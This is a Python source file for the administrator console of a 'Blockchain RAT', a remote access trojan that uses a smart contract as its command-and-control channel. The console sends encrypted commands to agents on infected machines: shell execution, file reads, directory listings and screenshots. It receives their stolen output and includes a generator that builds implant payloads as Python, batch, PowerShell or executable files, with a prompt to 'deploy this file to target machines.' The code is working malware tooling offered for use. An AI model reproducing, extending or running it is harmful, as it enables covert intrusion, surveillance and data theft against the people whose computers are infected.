"""
Blockchain RAT Administrator GUI
PyQt5-based graphical interface for managing agents
"""

import sys
import os
import json
import time
import threading
from pathlib import Path
from datetime import datetime
import base64

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLineEdit, QLabel, QListWidget, QTabWidget,
    QGroupBox, QMessageBox, QInputDialog, QFileDialog, QSplitter,
    QTableWidget, QTableWidgetItem, QHeaderView, QComboBox
)
from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt5.QtGui import QFont, QTextCursor, QPixmap

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from shared.blockchain_client import BlockchainClient
from shared.encryption import EncryptionManager


class SignalEmitter(QObject):
    """Signal emitter for thread-safe GUI updates"""
    message_received = pyqtSignal(dict)
    log_message = pyqtSignal(str)


class AdministratorGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        
        self.encryption = EncryptionManager()
        self.blockchain = None
        self.sessions = {}
        self.current_session = None
        self.polling_active = False
        
        # Signal emitter
        self.signals = SignalEmitter()
        self.signals.message_received.connect(self.on_message_received)
        self.signals.log_message.connect(self.log)
        
        # Load configuration
        self.config = self.load_config()
        
        # Setup UI first (before loading keys, which needs log_text)
        self.init_ui()
        
        # Load admin keys after UI is initialized
        self.load_keys()
        
        # Setup timer for polling
        self.poll_timer = QTimer()
        self.poll_timer.timeout.connect(self.poll_messages)
        
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle('Blockchain RAT - Administrator Console')
        self.setGeometry(100, 100, 1400, 900)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        
        # Top bar - Connection
        connection_group = QGroupBox("Blockchain Connection")
        connection_layout = QHBoxLayout()
        
        self.rpc_input = QLineEdit(self.config.get('rpc_url', 'https://rpc-mumbai.maticvigil.com'))
        self.rpc_input.setPlaceholderText("RPC URL")
        connection_layout.addWidget(QLabel("RPC:"))
        connection_layout.addWidget(self.rpc_input)
        
        self.contract_input = QLineEdit(self.config.get('contract_address', ''))
        self.contract_input.setPlaceholderText("Contract Address")
        connection_layout.addWidget(QLabel("Contract:"))
        connection_layout.addWidget(self.contract_input)
        
        self.private_key_input = QLineEdit(self.config.get('private_key', ''))
        self.private_key_input.setPlaceholderText("Private Key")
        self.private_key_input.setEchoMode(QLineEdit.Password)
        connection_layout.addWidget(QLabel("Private Key:"))
        connection_layout.addWidget(self.private_key_input)
        
        self.connect_btn = QPushButton("Connect")
        self.connect_btn.clicked.connect(self.connect_blockchain)
        connection_layout.addWidget(self.connect_btn)
        
        connection_group.setLayout(connection_layout)
        main_layout.addWidget(connection_group)
        
        # Status bar
        status_layout = QHBoxLayout()
        self.status_label = QLabel("Status: Not connected")
        self.balance_label = QLabel("Balance: -")
        self.gas_label = QLabel("Gas: -")
        status_layout.addWidget(self.status_label)
        status_layout.addStretch()
        status_layout.addWidget(self.balance_label)
        status_layout.addWidget(self.gas_label)
        main_layout.addLayout(status_layout)
        
        # Main content - Splitter
        splitter = QSplitter(Qt.Horizontal)
        
        # Left panel - Sessions
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        left_layout.addWidget(QLabel("Sessions:"))
        self.session_list = QListWidget()
        self.session_list.itemClicked.connect(self.on_session_selected)
        left_layout.addWidget(self.session_list)
        
        session_btn_layout = QHBoxLayout()
        self.new_session_btn = QPushButton("New Session")
        self.new_session_btn.clicked.connect(self.create_new_session)
        self.new_session_btn.setEnabled(False)
        session_btn_layout.addWidget(self.new_session_btn)
        
        self.refresh_sessions_btn = QPushButton("Refresh")
        self.refresh_sessions_btn.clicked.connect(self.refresh_sessions)
        self.refresh_sessions_btn.setEnabled(False)
        session_btn_layout.addWidget(self.refresh_sessions_btn)
        
        left_layout.addLayout(session_btn_layout)
        
        # Payload Generator button
        self.generate_payload_btn = QPushButton("Generate Payload")
        self.generate_payload_btn.clicked.connect(self.generate_payload)
        self.generate_payload_btn.setStyleSheet("background-color: #2ecc71; color: white; font-weight: bold;")
        left_layout.addWidget(self.generate_payload_btn)
        
        splitter.addWidget(left_panel)
        
        # Right panel - Tabs
        self.tabs = QTabWidget()
        
        # Command tab
        command_tab = QWidget()
        command_layout = QVBoxLayout(command_tab)
        
        # Command presets
        preset_layout = QHBoxLayout()
        preset_layout.addWidget(QLabel("Quick Commands:"))
        
        self.sysinfo_btn = QPushButton("System Info")
        self.sysinfo_btn.clicked.connect(lambda: self.send_quick_command('sysinfo'))
        preset_layout.addWidget(self.sysinfo_btn)
        
        self.screenshot_btn = QPushButton("Screenshot")
        self.screenshot_btn.clicked.connect(lambda: self.send_quick_command('screenshot'))
        preset_layout.addWidget(self.screenshot_btn)
        
        self.ping_btn = QPushButton("Ping")
        self.ping_btn.clicked.connect(lambda: self.send_quick_command('ping'))
        preset_layout.addWidget(self.ping_btn)
        
        preset_layout.addStretch()
        command_layout.addLayout(preset_layout)
        
        # Custom command
        custom_layout = QHBoxLayout()
        custom_layout.addWidget(QLabel("Command Type:"))
        self.cmd_type_combo = QComboBox()
        self.cmd_type_combo.addItems(['execute', 'list_dir', 'read_file', 'sysinfo', 'screenshot', 'ping'])
        custom_layout.addWidget(self.cmd_type_combo)
        command_layout.addLayout(custom_layout)
        
        self.command_input = QTextEdit()
        self.command_input.setPlaceholderText('Enter command data (JSON format)...\nExample: {"command": "whoami"}')
        self.command_input.setMaximumHeight(100)
        command_layout.addWidget(self.command_input)
        
        send_layout = QHBoxLayout()
        self.send_btn = QPushButton("Send Command")
        self.send_btn.clicked.connect(self.send_command)
        self.send_btn.setEnabled(False)
        send_layout.addWidget(self.send_btn)
        send_layout.addStretch()
        command_layout.addLayout(send_layout)
        
        # Response area
        command_layout.addWidget(QLabel("Responses:"))
        self.response_text = QTextEdit()
        self.response_text.setReadOnly(True)
        command_layout.addWidget(self.response_text)
        
        self.tabs.addTab(command_tab, "Commands")
        
        # Session info tab
        info_tab = QWidget()
        info_layout = QVBoxLayout(info_tab)
        
        self.session_info_text = QTextEdit()
        self.session_info_text.setReadOnly(True)
        info_layout.addWidget(self.session_info_text)
        
        self.tabs.addTab(info_tab, "Session Info")
        
        # Log tab
        log_tab = QWidget()
        log_layout = QVBoxLayout(log_tab)
        
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        
        clear_log_btn = QPushButton("Clear Log")
        clear_log_btn.clicked.connect(self.log_text.clear)
        log_layout.addWidget(clear_log_btn)
        
        self.tabs.addTab(log_tab, "Log")
        
        splitter.addWidget(self.tabs)
        splitter.setStretchFactor(1, 3)
        
        main_layout.addWidget(splitter)
        
        # Apply styling
        self.setStyleSheet("""
            QMainWindow {
                background-color: #2b2b2b;
            }
            QWidget {
                background-color: #2b2b2b;
                color: #ffffff;
            }
            QGroupBox {
                border: 1px solid #555555;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                color: #ffffff;
            }
            QPushButton {
                background-color: #0d7377;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
            }
            QPushButton:hover {
                background-color: #14FFEC;
                color: #000000;
            }
            QPushButton:disabled {
                background-color: #555555;
                color: #888888;
            }
            QLineEdit, QTextEdit {
                background-color: #1e1e1e;
                color: #ffffff;
                border: 1px solid #555555;
                border-radius: 3px;
                padding: 5px;
            }
            QListWidget {
                background-color: #1e1e1e;
                color: #ffffff;
                border: 1px solid #555555;
            }
            QListWidget::item:selected {
                background-color: #0d7377;
            }
            QTabWidget::pane {
                border: 1px solid #555555;
            }
            QTabBar::tab {
                background-color: #1e1e1e;
                color: #ffffff;
                padding: 8px 16px;
                border: 1px solid #555555;
            }
            QTabBar::tab:selected {
                background-color: #0d7377;
            }
            QComboBox {
                background-color: #1e1e1e;
                color: #ffffff;
                border: 1px solid #555555;
                padding: 5px;
            }
        """)
        
        self.log("Administrator console initialized")
    
    def load_config(self):
        """Load configuration"""
        config_path = Path(__file__).parent / 'admin_config.json'
        if config_path.exists():
            with open(config_path, 'r') as f:
                return json.load(f)
        return {}
    
    def save_config(self):
        """Save configuration"""
        config_path = Path(__file__).parent / 'admin_config.json'
        self.config = {
            'rpc_url': self.rpc_input.text(),
            'contract_address': self.contract_input.text(),
            'private_key': self.private_key_input.text()
        }
        with open(config_path, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def load_keys(self):
        """Load or generate admin keys"""
        keys_path = Path(__file__).parent / 'admin_keys.json'
        
        if keys_path.exists():
            with open(keys_path, 'r') as f:
                keys = json.load(f)
                self.private_key = keys['private_key']
                self.public_key = keys['public_key']
                self.log("Loaded existing admin keys")
        else:
            keys = self.encryption.generate_rsa_keypair()
            self.private_key = keys['private_key']
            self.public_key = keys['public_key']
            
            with open(keys_path, 'w') as f:
                json.dump({
                    'private_key': self.private_key,
                    'public_key': self.public_key
                }, f, indent=2)
            
            self.log("Generated new admin keys")
    
    def log(self, message):
        """Add log message"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_text.append(f"[{timestamp}] {message}")
    
    def connect_blockchain(self):
        """Connect to blockchain"""
        try:
            self.save_config()
            
            self.blockchain = BlockchainClient({
                'rpc_url': self.rpc_input.text(),
                'private_key': self.private_key_input.text(),
                'contract_address': self.contract_input.text()
            })
            
            # Register admin public key
            public_key_hex = self.encryption.public_key_to_hex(self.public_key)
            self.blockchain.register_agent(public_key_hex)
            
            # Update UI
            self.status_label.setText(f"Status: Connected ({self.blockchain.address})")
            self.connect_btn.setEnabled(False)
            self.new_session_btn.setEnabled(True)
            self.refresh_sessions_btn.setEnabled(True)
            
            # Update balance and gas
            self.update_blockchain_info()
            
            self.log(f"Connected to blockchain: {self.blockchain.address}")
            
            # Load existing sessions
            self.refresh_sessions()
            
        except Exception as e:
            QMessageBox.critical(self, "Connection Error", f"Failed to connect: {str(e)}")
            self.log(f"Connection error: {e}")
    
    def update_blockchain_info(self):
        """Update balance and gas price"""
        if self.blockchain:
            try:
                balance = self.blockchain.get_balance()
                gas = self.blockchain.get_gas_price()
                self.balance_label.setText(f"Balance: {balance:.4f} MATIC")
                self.gas_label.setText(f"Gas: {gas:.2f} Gwei")
            except Exception as e:
                self.log(f"Error updating blockchain info: {e}")
    
    def create_new_session(self):
        """Create a new session"""
        agent_address, ok = QInputDialog.getText(
            self, 'New Session', 'Enter agent wallet address:'
        )
        
        if ok and agent_address:
            try:
                self.log(f"Creating session with agent: {agent_address}")
                session_id = self.blockchain.create_session(agent_address)
                self.log(f"Session created: {session_id}")
                
                # Refresh sessions
                self.refresh_sessions()
                
                QMessageBox.information(self, "Success", f"Session created: {session_id}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to create session: {str(e)}")
                self.log(f"Session creation error: {e}")
    
    def refresh_sessions(self):
        """Refresh session list"""
        if not self.blockchain:
            return
        
        try:
            session_ids = self.blockchain.get_admin_sessions()
            self.session_list.clear()
            self.sessions = {}
            
            for session_id in session_ids:
                session = self.blockchain.get_session(session_id)
                self.sessions[session_id] = session
                
                status = "Active" if session['active'] else "Inactive"
                self.session_list.addItem(f"{session_id[:16]}... ({status})")
            
            self.log(f"Loaded {len(session_ids)} sessions")
        except Exception as e:
            self.log(f"Error refreshing sessions: {e}")
    
    def on_session_selected(self, item):
        """Handle session selection"""
        index = self.session_list.row(item)
        session_id = list(self.sessions.keys())[index]
        
        self.current_session = session_id
        session = self.sessions[session_id]
        
        # Update session info
        info = f"""Session ID: {session_id}
Admin: {session['admin']}
Agent: {session['agent']}
Active: {session['active']}
Created: {datetime.fromtimestamp(session['created_at']).strftime('%Y-%m-%d %H:%M:%S')}
Last Activity: {datetime.fromtimestamp(session['last_activity']).strftime('%Y-%m-%d %H:%M:%S')}
Admin Messages: {session['admin_seq_num']}
Agent Messages: {session['agent_seq_num']}
"""
        self.session_info_text.setText(info)
        
        # Enable send button
        self.send_btn.setEnabled(True)
        
        # Start polling
        if not self.polling_active:
            self.polling_active = True
            self.poll_timer.start(5000)  # Poll every 5 seconds
        
        self.log(f"Selected session: {session_id[:16]}...")
    
    def send_quick_command(self, cmd_type):
        """Send a quick command"""
        command = {'type': cmd_type}
        self.send_command_data(command)
    
    def send_command(self):
        """Send custom command"""
        try:
            cmd_type = self.cmd_type_combo.currentText()
            cmd_data_text = self.command_input.toPlainText().strip()
            
            if cmd_data_text:
                cmd_data = json.loads(cmd_data_text)
            else:
                cmd_data = {}
            
            cmd_data['type'] = cmd_type
            
            self.send_command_data(cmd_data)
        except json.JSONDecodeError as e:
            QMessageBox.warning(self, "Invalid JSON", f"Command data must be valid JSON: {str(e)}")
    
    def send_command_data(self, command):
        """Send command data to agent"""
        if not self.current_session:
            QMessageBox.warning(self, "No Session", "Please select a session first")
            return
        
        try:
            session = self.sessions[self.current_session]
            
            # Get agent's public key
            agent_key_hex = self.blockchain.get_agent_public_key(session['agent'])
            agent_public_key = self.encryption.hex_to_public_key(agent_key_hex)
            
            # Encrypt command
            command_json = json.dumps(command)
            encrypted = self.encryption.hybrid_encrypt(command_json, agent_public_key)
            hex_payload = self.encryption.encode_payload_for_blockchain(encrypted)
            
            # Get next sequence number
            next_seq = session['admin_seq_num'] + 1
            
            # Send to blockchain
            self.log(f"Sending command: {command['type']} (seq: {next_seq})")
            self.blockchain.send_message(self.current_session, hex_payload, next_seq)
            
            # Update session
            session['admin_seq_num'] = next_seq
            
            self.log("Command sent successfully")
            self.response_text.append(f"\n>>> Sent: {command['type']}\n")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to send command: {str(e)}")
            self.log(f"Command send error: {e}")
    
    def poll_messages(self):
        """Poll for new messages"""
        if not self.current_session or not self.blockchain:
            return
        
        try:
            session = self.sessions[self.current_session]
            last_count = session['agent_seq_num']
            current_count = self.blockchain.get_message_count(self.current_session)
            
            if current_count > last_count:
                new_messages = self.blockchain.get_messages(
                    self.current_session,
                    last_count,
                    current_count - last_count
                )
                
                for message in new_messages:
                    sender = message[0]
                    
                    # Only process messages from agent
                    if sender.lower() == session['agent'].lower():
                        encrypted_payload = message[1]
                        
                        # Decrypt
                        hex_payload = '0x' + encrypted_payload.hex()
                        decoded = self.encryption.decode_payload_from_blockchain(hex_payload)
                        decrypted = self.encryption.hybrid_decrypt(decoded, self.private_key)
                        
                        # Parse response
                        response_data = decrypted.decode('utf-8')
                        
                        # Emit signal for GUI update
                        self.signals.message_received.emit({
                            'data': response_data,
                            'timestamp': message[2]
                        })
                
                # Update session
                session['agent_seq_num'] = current_count
        
        except Exception as e:
            self.log(f"Polling error: {e}")
    
    def on_message_received(self, message):
        """Handle received message"""
        try:
            response_data = json.loads(message['data'])
            timestamp = datetime.fromtimestamp(message['timestamp']).strftime('%H:%M:%S')
            
            self.response_text.append(f"\n<<< Response [{timestamp}]:")
            
            # Handle screenshot
            if 'screenshot' in response_data:
                img_data = base64.b64decode(response_data['screenshot'])
                
                # Save screenshot
                screenshot_path = Path(__file__).parent / f"screenshot_{int(time.time())}.png"
                with open(screenshot_path, 'wb') as f:
                    f.write(img_data)
                
                self.response_text.append(f"Screenshot saved: {screenshot_path}")
            else:
                self.response_text.append(json.dumps(response_data, indent=2))
            
            # Scroll to bottom
            self.response_text.moveCursor(QTextCursor.End)
            
            self.log("Received response from agent")
        
        except Exception as e:
            self.response_text.append(f"Error parsing response: {e}")
            self.log(f"Response parsing error: {e}")
    
    def generate_payload(self):
        """Generate agent payload with embedded configuration"""
        from PyQt5.QtWidgets import QDialog, QVBoxLayout, QHBoxLayout, QRadioButton, QButtonGroup
        
        # Create dialog
        dialog = QDialog(self)
        dialog.setWindowTitle("Generate Agent Payload")
        dialog.setGeometry(200, 200, 600, 400)
        
        layout = QVBoxLayout()
        
        # Title
        title = QLabel("<h2>Agent Payload Generator</h2>")
        layout.addWidget(title)
        
        # Configuration inputs
        config_group = QGroupBox("Agent Configuration")
        config_layout = QVBoxLayout()
        
        # RPC URL
        rpc_layout = QHBoxLayout()
        rpc_layout.addWidget(QLabel("RPC URL:"))
        rpc_input = QLineEdit(self.config.get('rpc_url', ''))
        rpc_layout.addWidget(rpc_input)
        config_layout.addLayout(rpc_layout)
        
        # Contract Address
        contract_layout = QHBoxLayout()
        contract_layout.addWidget(QLabel("Contract:"))
        contract_input = QLineEdit(self.config.get('contract_address', ''))
        contract_layout.addWidget(contract_input)
        config_layout.addLayout(contract_layout)
        
        # Private Key
        key_layout = QHBoxLayout()
        key_layout.addWidget(QLabel("Private Key:"))
        key_input = QLineEdit()
        key_input.setPlaceholderText("Agent wallet private key (leave empty to generate new)")
        key_layout.addWidget(key_input)
        config_layout.addLayout(key_layout)
        
        # Poll Interval
        poll_layout = QHBoxLayout()
        poll_layout.addWidget(QLabel("Poll Interval:"))
        poll_input = QLineEdit("10")
        poll_input.setPlaceholderText("Seconds")
        poll_layout.addWidget(poll_input)
        config_layout.addLayout(poll_layout)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Payload type selection
        type_group = QGroupBox("Payload Type")
        type_layout = QVBoxLayout()
        
        btn_group = QButtonGroup()
        
        py_radio = QRadioButton("Python Script (.py) - Standalone Python file")
        py_radio.setChecked(True)
        btn_group.addButton(py_radio)
        type_layout.addWidget(py_radio)
        
        bat_radio = QRadioButton("Batch Script (.bat) - Windows installer")
        btn_group.addButton(bat_radio)
        type_layout.addWidget(bat_radio)
        
        ps_radio = QRadioButton("PowerShell Script (.ps1) - Windows PowerShell")
        btn_group.addButton(ps_radio)
        type_layout.addWidget(ps_radio)
        
        exe_radio = QRadioButton("Executable (.exe) - Requires PyInstaller")
        btn_group.addButton(exe_radio)
        type_layout.addWidget(exe_radio)
        
        type_group.setLayout(type_layout)
        layout.addWidget(type_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        generate_btn = QPushButton("Generate")
        generate_btn.setStyleSheet("background-color: #2ecc71; color: white; padding: 10px;")
        button_layout.addWidget(generate_btn)
        
        cancel_btn = QPushButton("Cancel")
        cancel_btn.clicked.connect(dialog.reject)
        button_layout.addWidget(cancel_btn)
        
        layout.addLayout(button_layout)
        
        dialog.setLayout(layout)
        
        def on_generate():
            # Get configuration
            config = {
                'rpc_url': rpc_input.text(),
                'contract_address': contract_input.text(),
                'private_key': key_input.text() or self._generate_new_wallet(),
                'poll_interval': int(poll_input.text() or 10)
            }
            
            # Determine payload type
            if py_radio.isChecked():
                ext = ".py"
                filter_str = "Python Files (*.py)"
            elif bat_radio.isChecked():
                ext = ".bat"
                filter_str = "Batch Files (*.bat)"
            elif ps_radio.isChecked():
                ext = ".ps1"
                filter_str = "PowerShell Files (*.ps1)"
            else:
                ext = ".exe"
                filter_str = "Executable Files (*.exe)"
            
            # Ask for save location
            output_path, _ = QFileDialog.getSaveFileName(
                self,
                "Save Agent Payload",
                f"agent{ext}",
                filter_str
            )
            
            if not output_path:
                return
            
            try:
                from administrator.payload_generator import PayloadGenerator
                generator = PayloadGenerator()
                
                # Generate payload
                if py_radio.isChecked():
                    generator.generate_python_payload(config, output_path)
                elif bat_radio.isChecked():
                    generator.generate_batch_script(config, output_path)
                elif ps_radio.isChecked():
                    generator.generate_powershell_script(config, output_path)
                else:
                    generator.generate_exe_payload(config, output_path)
                
                QMessageBox.information(
                    self,
                    "Success",
                    f"Payload generated successfully!\n\nLocation: {output_path}\n\nAgent Wallet: {config['private_key'][:10]}...\n\nDeploy this file to target machines."
                )
                
                self.log(f"Generated payload: {output_path}")
                dialog.accept()
                
            except Exception as e:
                QMessageBox.critical(
                    self,
                    "Error",
                    f"Failed to generate payload:\n{str(e)}"
                )
                self.log(f"Payload generation error: {e}")
        
        generate_btn.clicked.connect(on_generate)
        
        dialog.exec_()
    
    def _generate_new_wallet(self):
        """Generate a new Ethereum wallet and return private key"""
        from eth_account import Account
        account = Account.create()
        return account.key.hex()


def main():
    app = QApplication(sys.argv)
    
    # Set application font
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = AdministratorGUI()
    window.show()
    
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()

